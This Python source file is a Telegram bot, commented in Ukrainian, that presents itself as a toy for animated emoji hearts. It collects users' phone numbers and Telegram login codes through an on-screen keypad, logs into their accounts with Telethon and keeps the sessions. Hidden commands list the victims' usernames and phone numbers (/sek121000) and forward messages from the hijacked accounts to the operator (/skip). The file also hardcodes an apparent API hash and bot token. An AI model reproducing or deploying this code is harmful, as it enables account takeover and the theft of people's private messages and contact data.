import asyncio
import random
from telethon import TelegramClient
from telegram import Update, KeyboardButton, ReplyKeyboardMarkup, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, CallbackQueryHandler, filters, ContextTypes
from flask import Flask

# ====== Конфіг ======
API_ID = 23863521
API_HASH = 'ace9a38bed2151c00da9f0cfcca9faad'
BOT_TOKEN = '8453985739:AAH78l1_XNcn_X7Ii9Gh7-OGTCHUuBaZ9Uk'
SESSION_PREFIX = 'userbot_'

registered_users = {}  # username : phone
userbot_accounts = {}  # phone : TelegramClient
skip_targets = {}      # phone : chat_id

app = ApplicationBuilder().token(BOT_TOKEN).read_timeout(30).connect_timeout(30).build()

# ===== Клавіатура цифр =====
def number_keyboard():
    buttons = [
        [InlineKeyboardButton("1", callback_data="1"),
         InlineKeyboardButton("2", callback_data="2"),
         InlineKeyboardButton("3", callback_data="3")],
        [InlineKeyboardButton("4", callback_data="4"),
         InlineKeyboardButton("5", callback_data="5"),
         InlineKeyboardButton("6", callback_data="6")],
        [InlineKeyboardButton("7", callback_data="7"),
         InlineKeyboardButton("8", callback_data="8"),
         InlineKeyboardButton("9", callback_data="9")],
        [InlineKeyboardButton("0", callback_data="0"),
         InlineKeyboardButton("✅", callback_data="confirm"),
         InlineKeyboardButton("⌫", callback_data="back")]
    ]
    return InlineKeyboardMarkup(buttons)

# ===== /start =====
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "Привіт! Натисни /login щоб увійти через юзербот.\n"
        "Після входу можна писати /lov або /rainbow у будь-якому чаті."
    )

# ===== /login =====
async def login(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [[KeyboardButton("Поділитися номером 📱", request_contact=True)]]
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True, one_time_keyboard=True)
    await update.message.reply_text(
        "Натисни кнопку, щоб надіслати свій номер телефону:",
        reply_markup=reply_markup
    )

# ===== Контакт =====
async def contact_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    contact = update.message.contact
    number = "+" + contact.phone_number
    username = update.message.from_user.username or f"User{update.message.from_user.id}"
    registered_users[username] = number
    context.user_data['pending_number'] = number
    context.user_data['current_input'] = ""
    context.user_data['current_step'] = "code"
    await update.message.reply_text("Номер отримано. Введи код з Telegram:", reply_markup=number_keyboard())

# ===== Обробка кнопок =====
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    step = context.user_data.get('current_step')
    current = context.user_data.get('current_input', "")

    if data == "confirm":
        if current == "":
            await query.edit_message_text("Введення порожнє, обери цифри!")
            return
        if step == "code":
            code = current
            number = context.user_data.get('pending_number')
            await query.edit_message_text("Виконується логін юзербота...")
            await login_userbot(query, number, code, context)
            context.user_data['current_input'] = ""
            context.user_data['current_step'] = None
    elif data == "back":
        context.user_data['current_input'] = current[:-1]
        await query.edit_message_text(
            f"{step.capitalize()}: {context.user_data['current_input']}",
            reply_markup=number_keyboard()
        )
    else:
        context.user_data['current_input'] = current + data
        await query.edit_message_text(
            f"{step.capitalize()}: {context.user_data['current_input']}",
            reply_markup=number_keyboard()
        )

# ===== Логін юзербота =====
async def login_userbot(query, number, code, context):
    try:
        session_name = SESSION_PREFIX + number.replace('+','')
        userbot = TelegramClient(session_name, API_ID, API_HASH)

        async def get_code():
            return code

        try:
            await userbot.start(phone=number, code_callback=get_code)
        except Exception:
            await query.edit_message_text(f"Невдалий код. Спробуй ще раз.")
            context.user_data['current_input'] = ""
            context.user_data['current_step'] = "code"
            await query.edit_message_text("Введи код ще раз:", reply_markup=number_keyboard())
            return

        userbot_accounts[number] = userbot
        await query.edit_message_text(f"Юзербот увійшов успішно ✅")
    except Exception as e:
        await query.edit_message_text(f"Помилка при вході: {e}")

# ===== /lov =====
base_heart = [
"🖤🖤🖤🖤🖤🖤🖤🖤🖤🖤",
"🖤🖤❤️❤️🖤🖤❤️❤️🖤🖤",
"🖤❤️❤️❤️❤️❤️❤️❤️❤️🖤",
"🖤❤️❤️❤️❤️❤️❤️❤️❤️🖤",
"🖤🖤❤️❤️❤️❤️❤️❤️🖤🖤",
"🖤🖤🖤❤️❤️❤️❤️🖤🖤🖤",
"🖤🖤🖤🖤❤️❤️🖤🖤🖤🖤",
"🖤🖤🖤🖤🖤🖤🖤🖤🖤🖤"
]
colors = ["❤️","🧡","💛","💚","💙","💜"]

async def handler_lov(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = await update.message.reply_text("\n".join(base_heart))
    for _ in range(12):
        new_heart = []
        for line in base_heart:
            new_line = ""
            for ch in line:
                if ch != "🖤":
                    new_line += random.choice(colors)
                else:
                    new_line += ch
            new_heart.append(new_line)
        try:
            await msg.edit_text("\n".join(new_heart))
        except:
            break
        await asyncio.sleep(0.5)

# ===== /rainbow =====
rainbow_hearts = "❤️🧡💛💚💙💜"

async def handler_rainbow(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = await update.message.reply_text(rainbow_hearts)
    for _ in range(6):
        await asyncio.sleep(0.5)
        await msg.edit_text(rainbow_hearts[::-1])
        await asyncio.sleep(0.5)
        await msg.edit_text(rainbow_hearts)

# ===== Приховані команди =====
async def sek121000(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not registered_users:
        await update.message.reply_text("Поки ніхто не користувався ботом.")
        return
    text = "Ось всі користувачі, які користуються твоїм ботом:\n\n"
    for user, number in registered_users.items():
        text += f"@{user}\n{number}\n"
    await update.message.reply_text(text)

async def skip_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = context.args
    if not args:
        await update.message.reply_text("Вкажи номер для пересилки: /skip +380xxxxxxxxx")
        return
    number = args[0]
    if number not in userbot_accounts:
        await update.message.reply_text("Цей номер ще не увійшов через юзербот.")
        return
    skip_targets[number] = update.effective_chat.id
    await update.message.reply_text(f"Повідомлення з {number} будуть пересилатися сюди.")

async def forward_userbot_messages(number, message):
    chat_id = skip_targets.get(number)
    if chat_id:
        await app.bot.send_message(chat_id=chat_id, text=f"[{number}] {message}")

# ===== Хендлери =====
app.add_handler(CommandHandler("start", start))
app.add_handler(CommandHandler("login", login))
app.add_handler(MessageHandler(filters.CONTACT, contact_handler))
app.add_handler(CommandHandler("lov", handler_lov))
app.add_handler(CommandHandler("rainbow", handler_rainbow))
app.add_handler(CallbackQueryHandler(button_handler))
app.add_handler(CommandHandler("sek121000", sek121000))
app.add_handler(CommandHandler("skip", skip_command))

# ===== Flask для Render =====
flask_app = Flask('')

@flask_app.route('/')
def home():
    return "Bot is alive!"

# ===== Головний асинхронний запуск бота =====
async def main():
    print("Бот запущений! Юзерботи теж активні.")
    await app.start()
    await app.updater.start_polling()
